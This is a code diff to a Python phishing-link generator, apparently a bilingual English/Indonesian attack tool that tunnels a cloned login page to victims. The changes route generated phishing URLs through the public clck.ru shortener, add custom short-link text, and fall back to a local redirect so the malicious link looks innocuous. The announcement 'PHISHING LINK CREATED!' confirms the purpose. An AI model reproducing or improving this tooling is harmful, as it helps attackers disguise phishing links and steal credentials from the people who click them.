@@ -1216,10 +1216,15 @@ class PhishingGenerator:
             self.server_url = None
 
     def _shorten_url_for_display(self, url):
-        short_code = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
-        self.short_links[short_code] = url
-        shortened = f"{self.server_url}/s/{short_code}" if self.server_url else url
-        console.print(f"[dim]🔗 Short: {shortened}[/]")
+        try:
+            r = requests.get(f"https://clck.ru/--?url={quote(url, safe='')}", timeout=8)
+            s = r.text.strip()
+            if r.status_code == 200 and s.startswith('https://clck.ru/'):
+                console.print(f"[dim]🔗 Short: {s}[/]")
+                return
+        except:
+            pass
+        console.print(f"[dim]🔗 Raw tunnel URL: {url}[/]")
 
     def setup_tunnel(self):
         self.clear_screen()
@@ -1528,16 +1533,31 @@ class PhishingGenerator:
             with open(template_path, "w", encoding="utf-8") as f:
                 f.write(proxy_template)
                 
-            short_code = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
-            self.short_links[short_code] = phish_url
-            shortened_url = f"{self.server_url}/s/{short_code}"
+            custom = console.input(f"\n[yellow][[?]] {'Custom short text (optional, enter to skip)' if self.language == 'en' else 'Custom teks pendek (opsional, enter untuk lewati)'}: [/]").strip()
+            if custom:
+                self.short_links[custom] = phish_url
+                shortened_url = f"{self.server_url}/s/{custom}"
+            else:
+                try:
+                    r = requests.get(f"https://clck.ru/--?url={quote(phish_url, safe='')}", timeout=8)
+                    s = r.text.strip()
+                    if r.status_code == 200 and s.startswith('https://clck.ru/'):
+                        shortened_url = s
+                    else:
+                        sc = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
+                        self.short_links[sc] = phish_url
+                        shortened_url = f"{self.server_url}/s/{sc}"
+                except:
+                    sc = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
+                    self.short_links[sc] = phish_url
+                    shortened_url = f"{self.server_url}/s/{sc}"
             
             sep = "─" * 40
             console.print(f"\n{sep}")
             console.print(f"🎣 {'LINK PHISHING BERHASIL DIBUAT!' if self.language == 'id' else 'PHISHING LINK CREATED!'}")
             console.print(sep)
             console.print(f"\n📎 {'URL Phishing' if self.language == 'id' else 'Phishing URL'}:\n   [green]{shortened_url}[/]\n")
-            console.print(f"✨ {'Link pendek via redirect server' if self.language == 'id' else 'Short link via server redirect'}")
+            console.print(f"✨ {'Link pendek via clck.ru / redirect server' if self.language == 'id' else 'Short link via clck.ru / server redirect'}")
             console.print(f"⚠️  {'Link aktif hingga program ditutup' if self.language == 'id' else 'Link active until program closes'}")
             console.print(sep)
             
